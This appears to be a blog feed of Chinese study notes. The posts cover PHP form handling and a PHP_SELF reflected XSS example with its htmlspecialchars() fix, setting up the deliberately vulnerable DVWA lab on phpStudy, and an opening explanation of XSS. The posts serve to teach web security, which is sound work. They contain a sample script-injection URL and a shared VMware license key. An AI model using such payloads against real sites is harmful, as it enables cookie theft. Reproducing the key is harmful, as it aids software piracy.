class="string">""</span> method=<span class="string">"post"</span>&gt; </div><div class="line">    &lt;select multiple=<span class="string">"multiple"</span> name=<span class="string">"q[]"</span>&gt;</div><div class="line">    &lt;option value=<span class="string">""</span>&gt;选择一个站点:&lt;/option&gt;</div><div class="line">    &lt;option value=<span class="string">"RUNOOB"</span>&gt;Runoob&lt;/option&gt;</div><div class="line">    &lt;option value=<span class="string">"GOOGLE"</span>&gt;Google&lt;/option&gt;</div><div class="line">    &lt;option value=<span class="string">"TAOBAO"</span>&gt;Taobao&lt;/option&gt;</div><div class="line">    &lt;/select&gt;</div><div class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</div><div class="line">    &lt;/form&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h3><p>单选按钮表单中 <code>name</code> 属性的值是一致的，<code>value</code> 值是不同的。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$q = <span class="keyword">isset</span>($_GET[<span class="string">'q'</span>])? htmlspecialchars($_GET[<span class="string">'q'</span>]) : <span class="string">''</span>;</div><div class="line"><span class="keyword">if</span>($q) &#123;</div><div class="line">        <span class="keyword">if</span>($q ==<span class="string">'RUNOOB'</span>) &#123;</div><div class="line">                <span class="keyword">echo</span> <span class="string">'菜鸟教程&lt;br&gt;http://www.runoob.com'</span>;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>($q ==<span class="string">'GOOGLE'</span>) &#123;</div><div class="line">                <span class="keyword">echo</span> <span class="string">'Google 搜索&lt;br&gt;http://www.google.com'</span>;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>($q ==<span class="string">'TAOBAO'</span>) &#123;</div><div class="line">                <span class="keyword">echo</span> <span class="string">'淘宝&lt;br&gt;http://www.taobao.com'</span>;</div><div class="line">        &#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="meta">?&gt;</span>&lt;form action=<span class="string">""</span> method=<span class="string">"get"</span>&gt; </div><div class="line">    &lt;input type=<span class="string">"radio"</span> name=<span class="string">"q"</span> value=<span class="string">"RUNOOB"</span> /&gt;Runoob</div><div class="line">    &lt;input type=<span class="string">"radio"</span> name=<span class="string">"q"</span> value=<span class="string">"GOOGLE"</span> /&gt;Google</div><div class="line">    &lt;input type=<span class="string">"radio"</span> name=<span class="string">"q"</span> value=<span class="string">"TAOBAO"</span> /&gt;Taobao</div><div class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</div><div class="line">&lt;/form&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$q = <span class="keyword">isset</span>($_POST[<span class="string">'q'</span>])? $_POST[<span class="string">'q'</span>] : <span class="string">''</span>;</div><div class="line"><span class="keyword">if</span>(is_array($q)) &#123;</div><div class="line">    $sites = <span class="keyword">array</span>(</div><div class="line">            <span class="string">'RUNOOB'</span> =&gt; <span class="string">'菜鸟教程: http://www.runoob.com'</span>,</div><div class="line">            <span class="string">'GOOGLE'</span> =&gt; <span class="string">'Google 搜索: http://www.google.com'</span>,</div><div class="line">            <span class="string">'TAOBAO'</span> =&gt; <span class="string">'淘宝: http://www.taobao.com'</span>,</div><div class="line">    );</div><div class="line">    <span class="keyword">foreach</span>($q <span class="keyword">as</span> $val) &#123;</div><div class="line">        <span class="comment">// PHP_EOL 为常量，用于换行</span></div><div class="line">        <span class="keyword">echo</span> $sites[$val] . PHP_EOL;</div><div class="line">    &#125;</div><div class="line">      </div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="meta">?&gt;</span>&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt; </div><div class="line">    &lt;input type=<span class="string">"checkbox"</span> name=<span class="string">"q[]"</span> value=<span class="string">"RUNOOB"</span>&gt; Runoob&lt;br&gt; </div><div class="line">    &lt;input type=<span class="string">"checkbox"</span> name=<span class="string">"q[]"</span> value=<span class="string">"GOOGLE"</span>&gt; Google&lt;br&gt; </div><div class="line">    &lt;input type=<span class="string">"checkbox"</span> name=<span class="string">"q[]"</span> value=<span class="string">"TAOBAO"</span>&gt; Taobao&lt;br&gt;</div><div class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</div><div class="line">&lt;/form&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h3 id="表单验证-1"><a href="#表单验证-1" class="headerlink" title="表单验证"></a>表单验证</h3><p>应该尽可能的对用户的输入进行验证（通过客户端脚本），该验证仅用于对输入信息作合法性判断。浏览器验证速度更快，并且可以减轻服务器的压力。</p>
<p>如果用户输入需要插入数据库，应该考虑使用服务器验证，需要作安全性验证。</p>
<p>在服务器验证表单的一种好的方式是，把表单的数据传给当前页面（异步提交的方式更好），而不是跳转到不同的页面。这样用户就可以在同一张表单页面得到错误信息。用户也就更容易发现错误了。</p>
<h2 id="表单验证-2"><a href="#表单验证-2" class="headerlink" title="表单验证"></a>表单验证</h2><p>一段html表单代码如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"&lt;?php echo htmlspecialchars($_SERVER["</span><span class="attr">PHP_SELF</span>"]);?&gt;</span>"&gt;</div><div class="line">“名字”: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span></div><div class="line">E-mail: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span>&gt;</span></div><div class="line">网址: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"website"</span>&gt;</span></div><div class="line">备注: <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">"comment"</span> <span class="attr">rows</span>=<span class="string">"5"</span> <span class="attr">cols</span>=<span class="string">"40"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></div><div class="line">性别:</div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">value</span>=<span class="string">"female"</span>&gt;</span>女</div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">value</span>=<span class="string">"male"</span>&gt;</span>男</div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>该表单使用 method=”post” 方法来提交数据。</p>
<p><code>$_SERVER[&quot;PHP_SELF&quot;]</code>是超级全局变量，返回当前正在执行脚本的文件名，与document root相关。 所以 <code>$_SERVER[&quot;PHP_SELF&quot;]</code> 会发送表单数据到当前页面，而不是跳转到不同的页面。</p>
<p><code>htmlspecialchars()</code>方法：把一些预定义的字符转换为 HTML 实体。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&amp; （和号） 成为 &amp;amp;</div><div class="line">&quot; （双引号） 成为 &amp;quot;</div><div class="line">&apos; （单引号） 成为 &amp;#039;</div><div class="line">&lt; （小于） 成为 &amp;lt;</div><div class="line">&gt; （大于） 成为 &amp;gt;</div></pre></td></tr></table></figure></p>
<h3 id="SERVER-“PHP-SELF”-被用作XSS攻击"><a href="#SERVER-“PHP-SELF”-被用作XSS攻击" class="headerlink" title="$_SERVER[“PHP_SELF”]被用作XSS攻击"></a>$_SERVER[“PHP_SELF”]被用作XSS攻击</h3><p>当黑客使用跨网站脚本的HTTP链接来攻击时，<code>$_SERVER[&quot;PHP_SELF&quot;]</code>服务器变量也会被植入脚本。原因就是跨网站脚本是附在执行文件的路径后面的，因此<code>$_SERVER[&quot;PHP_SELF&quot;]</code>的字符串就会包含HTTP链接后面的JavaScript程序代码。</p>
<p>指定以下表单文件名为 “test_form.php”:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"&lt;?php echo $_SERVER["</span><span class="attr">PHP_SELF</span>"];?&gt;</span>"&gt;</div></pre></td></tr></table></figure></p>
<p>现在，使用URL来指定提交地址 “test_form.php”,以上代码修改为如下所示:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"test_form.php"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>但是，当用户在浏览器输入以下地址：<code>http://www.runoob.com/test_form.php/%22%3E%3Cscript%3Ealert(&#39;hacked&#39;)%3C/script%3E</code><br>以上的 URL 中，将被解析为如下代码并执行:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"test_form.php/"</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'hacked'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>代码中添加了 script 标签，并添加了alert命令。 当页面载入时会执行该Javascript代码（用户会看到弹出框）。</p>
<h3 id="如何避免-SERVER-“PHP-SELF”-被利用"><a href="#如何避免-SERVER-“PHP-SELF”-被利用" class="headerlink" title="如何避免 $_SERVER[“PHP_SELF”] 被利用"></a>如何避免 $_SERVER[“PHP_SELF”] 被利用</h3><p>可以通过 <code>htmlspecialchars()</code> 函数来避免被利用，如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"&lt;?php echo htmlspecialchars($_SERVER["</span><span class="attr">PHP_SELF</span>"]);?&gt;</span>"&gt;</div></pre></td></tr></table></figure></p>
<p>htmlspecialchars() 把一些预定义的字符转换为 HTML 实体。现在如果用户想利用 <code>PHP_SELF</code> 变量, 结果将输出如下所示：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"test_form.php/&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert('hacked')&amp;lt;/script&amp;gt;"</span>&gt;</span></div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;来自菜鸟PHP基础语法学习总结。&lt;br&gt;
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>phpstudy与DVWA安装与配置，WAMP等相关概念学习</title>
    <link href="http://yoursite.com/2018/05/17/phpstudy%E4%B8%8EDVWA%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
    <id>http://yoursite.com/2018/05/17/phpstudy与DVWA安装与配置/</id>
    <published>2018-05-17T12:58:23.000Z</published>
    <updated>2018-05-29T02:23:07.382Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://ciphersaw.me/" target="_blank" rel="noopener">帆哥</a>教我玩WEB安全系列之最最开始环境配置篇。<br><a id="more"></a></p>
<h1 id="VMware虚拟机安装"><a href="#VMware虚拟机安装" class="headerlink" title="VMware虚拟机安装"></a>VMware虚拟机安装</h1><p>现在最新版本的是 VMware workstation 14，怕激活密钥不好找，就安装了VMware workstation 12 pro(激活密钥：5A02H-AU243-TZJ49-GTC7K-3C61N)。</p>
<p>选择一个安装目录即可双击安装程序，傻瓜式安装VMware。然后装了win7 x64系统。</p>
<h2 id="更改虚拟机的网络配置"><a href="#更改虚拟机的网络配置" class="headerlink" title="更改虚拟机的网络配置"></a>更改虚拟机的网络配置</h2><p><code>我的计算机</code>-&gt; <code>Windows 7 x64</code> -&gt; 右键单击 -&gt; <code>设置</code> -&gt; <code>网络适配器</code> -&gt; <code>网络连接</code>，选择桥接模式。</p>
<p>桥接模式直接连接物理网络，相当于在主机系统和虚拟机系统之间连接了一个网桥，而网桥两端的网络都属于同一网络，主机和虚拟机是处于同一网络中的对等主机。</p>
<p>桥接模式通常用于利用VMWare在局域网内新建一个虚拟服务器，为局域网用户提供网络服务。</p>
<p>【博客<a href="https://blog.csdn.net/clevercode/article/details/45934233" target="_blank" rel="noopener">VMware下网络配置三种模式对比（桥接模式，主机模式，网络地址转换）</a>】</p>
<p>【待解决的问题:】讲道理采用桥接模式之后，虚拟机和宿主主机是处于同一局域网中的对等主机，是可以互相ping通的，不知是不是路由器防火墙的缘故，虚拟机(192.168.1.101)和宿主主机(192.168.1.124)之间ping不通，但可以通过宿主主机的浏览器访问虚拟主机(此时的虚拟主机相当于一个虚拟服务器)。<br>宿主主机ping虚拟服务器：<br><img src="http://ou3oh86t1.bkt.clouddn.com/web%E5%AE%89%E5%85%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/RpingV.png" alt="宿主主机ping虚拟服务器"><br>虚拟服务器ping宿主主机：<br><img src="http://ou3oh86t1.bkt.clouddn.com/web%E5%AE%89%E5%85%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VpingR.png" alt="虚拟服务器ping宿主主机"><br>浏览器访问虚拟服务器：<br><img src="http://ou3oh86t1.bkt.clouddn.com/web%E5%AE%89%E5%85%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE%E8%99%9A%E6%8B%9F%E6%9C%8D%E5%8A%A1%E5%99%A8.png" alt="浏览器访问虚拟服务器"></p>
<h1 id="phpStudy安装配置"><a href="#phpStudy安装配置" class="headerlink" title="phpStudy安装配置"></a>phpStudy安装配置</h1><p>phpStudy是一个PHP调试环境的程序集成包，该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer,一次性安装，无须配置即可使用。可以用来模拟服务器环境，用于测试。</p>
<p>将phpStudy(2018版本)压缩包拖到虚拟机桌面，解压，安装即可。<br><img src="http://ou3oh86t1.bkt.clouddn.com/web%E5%AE%89%E5%85%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/phpStudy.png" alt="phpStudy"></p>
<h2 id="更改网站目录"><a href="#更改网站目录" class="headerlink" title="更改网站目录"></a>更改网站目录</h2><p>默认运行一个.php程序必须要将该程序放在WWW文件夹下面。phpStudy下的web服务相关目录如下所示：<br><img src="http://ou3oh86t1.bkt.clouddn.com/web%E5%AE%89%E5%85%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/phpStudy%E7%9B%AE%E5%BD%95.png" alt="phpStudy下的web服务相关目录"></p>
<p>web服务默认的运行目录是可以修改的: <code>其他选项菜单</code> -&gt; <code>phpStudy设置</code> -&gt; <code>端口常规设置</code><br><img src="http://ou3oh86t1.bkt.clouddn.com/web%E5%AE%89%E5%85%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/phpStudy%E7%AB%AF%E5%8F%A3%E8%AE%BE%E7%BD%AE.png" alt="端口常规设置"></p>
<p>如果更改了网站目录，要将之前WWW目录下的文件都拷过去。</p>
<h2 id="更改默认首页"><a href="#更改默认首页" class="headerlink" title="更改默认首页"></a>更改默认首页</h2><p>还是在<code>端口常规设置</code>，<code>默认首页</code>选项中更改( localhost 访问的的时候出现的页面即为首页)。</p>
<h2 id="更改端口号"><a href="#更改端口号" class="headerlink" title="更改端口号"></a>更改端口号</h2><p>还是在<code>端口常规设置</code>，默认端口是 80 端口，如果更改为其他端口号，localhost访问时需要带上端口号(localhost:端口号/xx.html)，否则可以省略(localhost/xx.html)。</p>
<p>其他phpStudy的功能和用法参考博客【<a href="http://www.php.cn/phpstudy-377909.html" target="_blank" rel="noopener">phpstudy使用说明教程</a>】。</p>
<h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p>将DVWA(Damn Vulnerable Web Application)的压缩包拖进虚拟机，解压后丢到网站目录下：<br><img src="http://ou3oh86t1.bkt.clouddn.com/web%E5%AE%89%E5%85%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/DVWA.png" alt="DVWA安装"></p>
<p><a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">DVWA</a>是一款基于php和mysql编写的用于常规WEB漏洞教学和检测的web脆弱性测试web应用。其中包含了SQL注入，盲注，文件包含，XSS，CSRF等一些常见的WEB漏洞，对进行Web渗透有较强的指导教学意义。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>(1) 首先进入设置页面，<strong>注意：</strong> 在phpStudy虚拟web服务器环境下安装DVWA时出现的问题如以下界面中红色字体提示部分：<br><img src="http://ou3oh86t1.bkt.clouddn.com/web%E5%AE%89%E5%85%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/DVWA%E8%AE%BE%E7%BD%AE%E6%97%B6%E7%9A%84%E9%94%99%E8%AF%AF.png" alt="安装DVWA时出现的问题"><br>解决方法参考博客 <a href="http://www.cnblogs.com/liuyunbuji/p/8385834.html" target="_blank" rel="noopener">DVWA安装出现的问题（phpStudy）</a><br>其中在解决<code>PHP function allow_url_include：Disabled</code>问题，修改完php.ini配置文件后记得重启phpStudy服务，不然还是显示错误提示。</p>
<p><strong>注意：</strong> 由于使用了phpStudy，以下(2)中的配置可以忽略(步骤（2）是用于自己配置数据库的相关操作)，phpStudy已经为我们配置好了相关端口和数据库。phpStudy默认的数据库设置如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$_DVWA[ <span class="string">'db_server'</span> ]   = <span class="string">'127.0.0.1'</span>;</div><div class="line">$_DVWA[ <span class="string">'db_database'</span> ] = <span class="string">'dvwa'</span>;</div><div class="line">$_DVWA[ <span class="string">'db_user'</span> ]     = <span class="string">'root'</span>;</div><div class="line">$_DVWA[ <span class="string">'db_password'</span> ] = <span class="string">'root'</span>;</div></pre></td></tr></table></figure>
<p>所以直接在setup页面点击<code>Create Database</code>按钮，初始化DVWA即可，就会跳转到login页面，WEB后台的账号是admin，密码password。</p>
<p>登录DVWA之后，通过<code>DVWA Security</code>设置项设置安全级别。</p>
<p>(2) 在设置页面，对DVWA需要的数据库进行创建和初始化。此时还没建立相关用户和数据库，那么接下来通过cmd建立数据库和用户：</p>
<ul>
<li>连接数据库。<code>mysql -u root -p</code>是连接数据库服务器的命令，<code>-u</code>表示用户名(root),<code>-p</code>表示密码，即在连接数据库之前要求输入用户名和密码|（MySQL用户名和密码默认都是root）。</li>
</ul>
<p><code>win+r</code>-&gt;打开cmd命令行，输入用户名和密码，哦豁，又出错了：<br><img src="http://ou3oh86t1.bkt.clouddn.com/web%E5%AE%89%E5%85%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E5%87%BA%E9%94%99.png" alt="连接数据库出错"></p>
<p>解决办法参考博客 <a href="https://blog.csdn.net/u013310517/article/details/52098479" target="_blank" rel="noopener">命令行中输入：mysql -u root -p 提示没有这个命令</a>，即将mysql的安装路径添加到系统环境变量中。</p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/web%E5%AE%89%E5%85%A8%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="连接数据库"></p>
<ul>
<li>此时进入mysql创建数据库 dvwa，然后创建新用户dvwa，并设置密码123456。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">mysql&gt;</span><span class="bash"> create database dvwa;</span></div><div class="line"><span class="meta">mysql&gt;</span><span class="bash"> insert into mysql.user(Host,User,Password) values(<span class="string">"localhost"</span>,<span class="string">'dvwa'</span>,password(<span class="string">'123456'</span>));</span></div><div class="line"><span class="meta">mysql&gt;</span><span class="bash"> flush privileges;</span></div></pre></td></tr></table></figure>
<p>其中<code>flush privileges</code>本质上的作用是将当前user和privilige表中的用户信息/权限设置从mysql库(MySQL数据库的内置库)中提取到内存里。MySQL用户数据和权限有修改后，希望在”不重启MySQL服务”的情况下直接生效，那么就需要执行这个命令。通常是在修改ROOT帐号的设置后，怕重启后无法再登录进来，那么直接flush之后就可以看权限设置是否生效，而不必冒太大风险。</p>
<ul>
<li>修改dvwa用户针对数据库dvwa的相关权限，授权dvwa用户拥有数据库dvwa的所有权限。格式：<code>grant 权限 on 数据库.* to 用户名@登录主机 identified by &quot;密码&quot;</code>。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">mysql&gt;</span><span class="bash"> grant all privileges on dvwa.* to dvwa@localhost identified by <span class="string">'123456'</span>;</span></div><div class="line"><span class="meta">mysql&gt;</span><span class="bash"> flush privileges;</span></div></pre></td></tr></table></figure>
<ul>
<li>修改dvwa目录下的<code>config/config.inc.php</code>以下内容：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$_DVWA[ <span class="string">'db_server'</span> ]   = <span class="string">'127.0.0.1'</span>;</div><div class="line">$_DVWA[ <span class="string">'db_database'</span> ] = <span class="string">'dvwa'</span>;</div><div class="line">$_DVWA[ <span class="string">'db_user'</span> ]     = <span class="string">'dvwa'</span>;</div><div class="line">$_DVWA[ <span class="string">'db_password'</span> ] = <span class="string">'123456'</span>;</div></pre></td></tr></table></figure>
<ul>
<li>然后在setup页面点击<code>Create Database</code>按钮，初始化DVWA。</li>
</ul>
<p><strong>以下是几个概念的补充学习。</strong></p>
<h1 id="WAMP"><a href="#WAMP" class="headerlink" title="WAMP"></a>WAMP</h1><p>Windows下的Apache+Mysql/MariaDB+Perl/PHP/Python，一组常用来搭建动态网站或者服务器的开源软件。<br>本身都是各自独立的程序，但是因为常被放在一起使用，拥有了越来越高的兼容度，共同组成了一个强大的Web应用程序平台。</p>
<p>LAMP是基于Linux，Apache，MySQL/MariaDB，Perl/PHP/Python的开放资源网络开发平台。Linux是开放系统；Apache是最通用的网络服务器；mySQL是带有基于网络管理附加工具的关系数据库；PHP是流行的对象脚本语言。</p>
<p>一般说来，大家都习惯 于将Apache、MySQL、PHP架设在Linux系统下，开发者在Windows操作系统下使用这些Linux环境里的工具称为使用WAMP。</p>
<p>目前有不少AMP（Apache\MySQL\PHP）的集成软件，可以让我们一次安装并设置好，WAMP集成环境主要有：</p>
<ul>
<li><p>XAMPP（Apache+MySQL+PHP+PERL）<br>XAMPP是一款具有中文说明的功能全面的集成环境，XAMPP并不仅仅针对Windows，而是一个适用于Linux、Windows、Mac OS X 和Solaris 的易于安装的Apache 发行版。软件包中包含Apache 服务器、MySQL、SQLite、PHP、Perl、FileZilla FTP Server、Tomcat等等。默认安装开放了所有功能，安全性有问题，需要进行额外的安全设定。</p>
</li>
<li><p>WampServer<br>WampServe是集成了Apache、MySQL、PHP、phpmyadmin的web服务器，支持Apache的mod_rewrite，PHP扩展、Apache模块只需要在菜单“开启/关闭”上点点就搞定，省去了修改配置文件的麻烦，是windows下的 Apache Mysql PHP集成安装环境。</p>
</li>
<li><p>AppServ<br>集成了Apache、PHP、MySQL、phpMyAdmin，较为轻量，版本很久未更新了。</p>
</li>
<li><p>phpStudy<br>该程序包集成最新的Apache+Nginx+IIS+MySQL+phpMyAdmin，一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境。</p>
</li>
</ul>
<h1 id="web容器"><a href="#web容器" class="headerlink" title="web容器"></a>web容器</h1><p>Java Servlet 可以理解为服务器端处理数据的java小程序，web容器则负责管理servlet等。</p>
<p>servlet没有main方法，那我们如何启动一个servlet，如何结束一个servlet，如何寻找一个servlet等等，都受控于另一个java应用，这个应用我们就称之为web容器。</p>
<p>一个典型的JavaEE系统可以由两部分构成首先是Web Server 用于处理静态资源，然后是JavaEE Application Server 用于处理业务的动态资源。而这两部分可以是单独的服务器例如Nginx+WebSphere也可以在一个服务器上完成比如Tomcat(Tomcat即可以处理静态资源又可以处理动态的Servlet)。</p>
<p>参考博客:</p>
<p><a href="https://www.jianshu.com/p/99f34a91aefe" target="_blank" rel="noopener">web开发中 web 容器的作用（如tomcat）</a></p>
<p><a href="https://www.cnblogs.com/vipyoumay/p/5853694.html" target="_blank" rel="noopener">JavaEE中Web服务器、Web容器、Application服务器区别及联系</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://ciphersaw.me/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;帆哥&lt;/a&gt;教我玩WEB安全系列之最最开始环境配置篇。&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="Web Security" scheme="http://yoursite.com/tags/Web-Security/"/>
    
      <category term="phpStudy" scheme="http://yoursite.com/tags/phpStudy/"/>
    
      <category term="DVWA" scheme="http://yoursite.com/tags/DVWA/"/>
    
      <category term="WAMP" scheme="http://yoursite.com/tags/WAMP/"/>
    
      <category term="Web容器" scheme="http://yoursite.com/tags/Web%E5%AE%B9%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>（二）Web安全深度剖析学习【XSS】</title>
    <link href="http://yoursite.com/2018/05/17/Web%E5%AE%89%E5%85%A8%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90%E5%AD%A6%E4%B9%A0-XSS/"/>
    <id>http://yoursite.com/2018/05/17/Web安全深度剖析学习-XSS/</id>
    <published>2018-05-17T08:56:51.000Z</published>
    <updated>2018-05-29T02:22:35.038Z</updated>
    
    <content type="html"><![CDATA[<p>《Web安全深度剖析》学习总结, 本部分主要包括XSS原理及三种类型XSS攻击和预防。<br>一篇较好的博客<a href="https://blog.csdn.net/u011781521/article/details/53894399" target="_blank" rel="noopener">XSS跨站脚本攻击(一)—-XSS攻击的三种类型</a>。<br><a id="more"></a></p>
<h1 id="XSS跨站脚本漏洞"><a href="#XSS跨站脚本漏洞" class="headerlink" title="XSS跨站脚本漏洞"></a>XSS跨站脚本漏洞</h1><p>XSS(Cross Site Scripting)，即跨站脚本攻击。指攻击者在网页中嵌入客户端脚本，通常是JS编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将会在用户浏览器上执行。XSS属于客户端攻击。</p>
<h2 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h2><p>XSS攻击在网页中嵌入客户端恶意脚本代码，这些恶意脚本代码一般使用JavaScript编写，所以JS能做到什么效果，XSS的威力就有多大。<br>JavaScript可以用来获取用户cookie，改变页面内容、url跳转，所以存在XSS漏洞的网站就可以盗取用户cookie、黑掉页面、导航到恶意网站。</p>
